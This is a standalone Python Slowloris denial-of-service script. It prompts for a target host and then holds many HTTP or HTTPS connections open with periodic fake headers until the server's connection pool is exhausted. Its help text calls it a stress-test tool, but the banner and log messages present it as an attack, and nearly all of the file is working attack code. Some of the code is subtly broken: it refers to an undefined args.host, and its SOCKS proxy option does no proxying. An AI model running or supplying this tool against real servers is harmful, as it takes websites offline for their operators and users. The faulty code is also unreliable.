#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import time
import rich

dog = """
CCCCCCCCCCOOCCOOOOO888\@8\@8888OOOOCCOOO888888888\@\@\@\@\@\@\@\@\@8\@8\@\@\@\@88
CCCCCCCCCCCCCCCOO888\@888888OOOCCCOOOO888888888888\@88888\@\@\@\@\@\@\@888\@8OOCC
CCCCCCCCCCCCCCOO88\@\@888888OOOOOOOOOO8888888O88888888O8O8OOO8888\@88\@\@8OOCOOOC
CCCCooooooCCCO88\@\@8\@88\@888OOOOOOO88888888888OOOOOOOOOOCCCCCOOOO888\@8888OOOCc
CooCoCoooCCCO8\@88\@8888888OOO888888888888888888OOOOCCCooooooooCCOOO8888888Cocooc
ooooooCoCCC88\@88888\@888OO8888888888888888O8O8888OOCCCooooccccccCOOOO88\@888OCoc
ooooCCOO8O888888888\@88O8OO88888OO888O8888OOOO88888OCocoococ::ccooCOO8O888888Cooo
oCCCCCCO8OOOCCCOO88\@88OOOOOO8888O888OOOOOCOO88888O8OOOCooCocc:::coCOOO888888OOCC
oCCCCCOOO88OCooCO88\@8OOOOOO88O888888OOCCCCoCOOO8888OOOOOOOCoc::::coCOOOO888O88OC
oCCCCOO88OOCCCCOO8\@\@8OOCOOOOO8888888OoocccccoCO8O8OO88OOOOOCc.:ccooCCOOOO88888O
CCCOOOO88OOCCOOO8\@888OOCCoooCOO8888Ooc::...::coOO88888O888OOo:cocooCCCCOOOOOO88O
CCCOO88888OOCOO8\@\@888OCcc:::cCOO888Oc..... ....cCOOOOOOOOOOOc.:cooooCCCOOOOOOOO
OOOOOO88888OOOO8\@8\@8Ooc:.:...cOO8O88c.      .  .coOOO888OOOOCoooooccoCOOOOOCO0O
OOOOO888\@8\@88888888Oo:. .  ...cO888Oc..          :oOOOOOOOOOCCoocooCoCoCOOOOOOO
COOO888\@88888888888Oo:.       .O8888C:  .oCOo.  ...cCCCOOOoooooocccooooooooCCCOO
CCCCOO888888O888888Oo. .o8Oo. .cO88Oo:       :. .:..ccoCCCooCooccooccccoooooCCCC0
coooCCO8\@88OO8O888Oo:::... ..  :cO8Oc. . .....  :.  .:ccCoooooccoooocccccooooCCC
:ccooooCO888OOOO8OOc..:...::. .co8\@8Coc::..  ....  ..:cooCooooccccc::::ccooCCooC
.:::coocccoO8OOOOOOC:..::....coCO8\@8OOCCOc:...  ....:ccoooocccc:::::::::cooooooC
....::::ccccoCCOOOOOCc......:oCO8\@8\@88OCCCoccccc::c::.:oCcc:::cccc:..::::cooooo
.......::::::::cCCCCCCoocc:cO888\@8888OOOOCOOOCoocc::.:cocc::cc:::...:::coocccccc
...........:::..:coCCCCCCCO88OOOO8OOOCCooCCCooccc::::ccc::::::.......:ccocccc:coc
.............::....:oCCoooooCOOCCOCCCoccococc:::::coc::::....... ...:::cccc:coooc
 ..... ............. .coocoooCCoco:::ccccccc:::ccc::..........  ....:::cc::::coCC
   .  . ...    .... ..  .:cccoCooc:..  ::cccc:::c:.. ......... ......::::c:ccccoc
  .  .. ... ..    .. ..   ..:...:cooc::cccccc:.....  .........  .....:::::ccoocco
       .   .         .. ..::cccc:.::ccoocc:. ........... ..  . ..:::.:::::::cccoo
 Welcome to Slowloris - the low bandwidth, yet greedy and poisonous HTTP client

 """
print(dog) 

# Define a list of user agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    # Add more user agents as needed
]

def send_line(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))

def send_header(self, name, value):
    self.send_line(f"{name}: {value}")

setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)

def init_socket(ip, port, args):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    if args.https:
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=args.host)

    s.connect((ip, port))

    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

    ua = user_agents[0]
    if args.randuseragent:
        ua = random.choice(user_agents)

    s.send_header("User-Agent", ua)
    s.send_header("Accept-language", "en-US,en,q=0.5")
    return s

def create_sockets(ip, port, socket_count, args):
    list_of_sockets = []
    for _ in range(socket_count):
        try:
            logging.debug("Creating socket nr %s", _)
            s = init_socket(ip, port, args)
        except socket.error as e:
            logging.debug(e)
            break
        list_of_sockets.append(s)
    return list_of_sockets

def slowloris_iteration(list_of_sockets, args):
    logging.info("Sending keep-alive headers...")
    logging.info("Socket count: %s", len(list_of_sockets))

    # Try to send a header line to each socket
    for s in list(list_of_sockets):
        try:
            s.send_header("X-a", random.randint(1, 5000))
        except socket.error as e:
            logging.error(f"Error sending header: {e}")
            list_of_sockets.remove(s)

    # Some of the sockets may have been closed due to errors or timeouts.
    # Re-create new sockets to replace them until we reach the desired number.
    diff = args.sockets - len(list_of_sockets)
    if diff <= 0:
        return

    logging.info("Creating %s new sockets...", diff)
    new_sockets = create_sockets(args.host, args.port, diff, args)
    list_of_sockets.extend(new_sockets)


def main():
    ip = args.proxy_host if args.useproxy else input("Enter the target host (website or IP): ")
    socket_count = args.sockets
    logging.info("Attacking %s with %s sockets.", ip, socket_count)

    logging.info("Creating sockets...")
    list_of_sockets = create_sockets(ip, args.port, socket_count, args)

    while True:
        try:
            slowloris_iteration(list_of_sockets, args)
        except (KeyboardInterrupt, SystemExit):
            logging.info("Stopping Slowloris")
            break
        except Exception as e:
            logging.debug("Error in Slowloris iteration: %s", e)
        logging.debug("Sleeping for %d seconds", args.sleeptime)
        time.sleep(args.sleeptime)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Slowloris, low bandwidth stress test tool for websites"
    )
    parser.add_argument(
        "-p", "--port", default=80, help="Port of webserver, usually 80", type=int
    )
    parser.add_argument(
        "-s",
        "--sockets",
        default=150,
        help="Number of sockets to use in the test",
        type=int,
    )
    parser.add_argument(
        "-v",
        "--verbose",
        dest="verbose",
        action="store_true",
        help="Increases logging",
    )
    parser.add_argument(
        "-ua",
        "--randuseragents",
        dest="randuseragent",
        action="store_true",
        help="Randomizes user-agents with each request",
    )
    parser.add_argument(
        "-x",
        "--useproxy",
        dest="useproxy",
        action="store_true",
        help="Use a SOCKS5 proxy for connecting",
    )
    parser.add_argument(
        "--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host"
    )
    parser.add_argument(
        "--proxy-port", default="8080", help="SOCKS5 proxy port", type=int
    )
    parser.add_argument(
        "--https",
        dest="https",
        action="store_true",
        help="Use HTTPS for the requests",
    )
    parser.add_argument(
        "--sleeptime",
        dest="sleeptime",
        default=15,
        type=int,
        help="Time to sleep between each header sent.",
    )
    parser.set_defaults(verbose=False)
    parser.set_defaults(randuseragent=False)
    parser.set_defaults(useproxy=False)
    parser.set_defaults(https=False)

    args = parser.parse_args()

    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.DEBUG if args.verbose else logging.INFO,
    )

    main()
